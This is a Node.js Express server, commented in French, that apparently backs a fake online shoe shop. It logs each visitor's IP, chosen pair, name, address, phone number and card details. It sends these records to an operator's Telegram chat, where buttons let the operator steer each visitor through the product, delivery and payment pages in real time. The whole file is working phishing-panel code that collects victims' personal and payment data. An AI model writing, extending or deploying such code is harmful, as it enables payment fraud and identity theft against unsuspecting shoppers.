const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');
const fetch = require('node-fetch');
const { v4: uuidv4 } = require('uuid');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname,'public')));

// Env vars (définies dans Render)
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID; // ton chat id
const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}` : null;

if(!BOT_TOKEN || !CHAT_ID) console.warn('⚠️ BOT_TOKEN ou CHAT_ID non défini.');

const sessions = {}; // sessionId -> { data:{...}, redirect:null }

// Envoi notif Telegram
async function sendTelegramNotif(data){
  if(!TELEGRAM_API || !CHAT_ID) return console.warn('Telegram non configuré.');

  // Création du message clair
  const lines = [
    '🆕 <b>NOUVELLE VISITE</b>',
    `🌐 <b>IP:</b> ${data.ip || '—'}`,        // on garde l'IP
    `📄 <b>Page:</b> ${data.page || 'Accueil'}`
  ];

  if(data.pair) lines.push(`👟 <b>Paire choisie:</b> ${data.pair}`);
  if(data.delivery){
    lines.push(`📦 <b>Livraison:</b> ${data.delivery.nom} ${data.delivery.prenom}`);
    lines.push(`🏠 <b>Adresse:</b> ${data.delivery.adresse}`);
    lines.push(`📞 <b>Téléphone:</b> ${data.delivery.telephone}`);
  }
  if(data.card) lines.push(`💳 <b>Carte:</b> ${data.card.panMasked}`);

  const text = lines.join('\n');

  // Inline keyboard (boutons restent les mêmes)
  const keyboard = {
    inline_keyboard: [
      [ { text: '➡️ Aller vers Produit', callback_data: 'redirect|' + data.sessionId + '|/product.html' } ],
      [ { text: '📦 Aller vers Livraison', callback_data: 'redirect|' + data.sessionId + '|/delivery.html' } ],
      [ { text: '💳 Aller vers Paiement', callback_data: 'redirect|' + data.sessionId + '|/payment.html' } ]
    ]
  };

  try {
    const res = await fetch(`${TELEGRAM_API}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type':'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
        parse_mode: 'HTML',
        reply_markup: keyboard
      })
    });
    const j = await res.json();
    if(!j.ok) console.error('Telegram error:', j);
  } catch(err){
    console.error('Erreur envoi Telegram:', err);
  }
}

// Endpoint: visite (GET pour facilité côté navigateur)
app.get('/api/visit', (req,res) => {
  const sid = uuidv4();
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  sessions[sid] = { data: { sessionId: sid, ip, page: 'Accueil' }, redirect: null };
  sendTelegramNotif(sessions[sid].data);
  res.json({ sessionId: sid });
});

// Endpoint: status pour polling (frontend)
app.get('/api/status', (req,res) => {
  const sessionId = req.query.sessionId;
  if(!sessionId || !sessions[sessionId]) return res.json({ redirect: null });
  const r = sessions[sessionId].redirect || null;
  // ne pas réinitialiser ici — on conservera jusqu'à confirmation (mais on peut reset si tu préfères)
  res.json({ redirect: r });
});

// Telegram webhook: reçoit callback_query quand tu cliques sur bouton
app.post('/telegramWebhook', bodyParser.json(), async (req,res) => {
  const body = req.body;
  if(body && body.callback_query){
    const cb = body.callback_query;
    const parts = (cb.data || '').split('|');
    const action = parts[0];
    if(action === 'redirect'){
      const sid = parts[1];
      const url = parts[2];
      if(sessions[sid]){
        sessions[sid].redirect = url;
        // envoie un petit message de confirmation au callback
        await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
          method: 'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify({ callback_query_id: cb.id, text: 'Redirection envoyée au visiteur.' })
        });
        // met à jour la notif (optionnel) avec note d'action
        sessions[sid].data.page = 'Admin redirigé vers ' + url;
        await sendTelegramNotif(sessions[sid].data);
      } else {
        await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
          method: 'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify({ callback_query_id: cb.id, text: 'Session introuvable.' })
        });
      }
    }
  }
  res.sendStatus(200);
});

app.get('/', (req,res) => {
  res.sendFile(path.join(__dirname,'public','index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Server listening on', PORT));
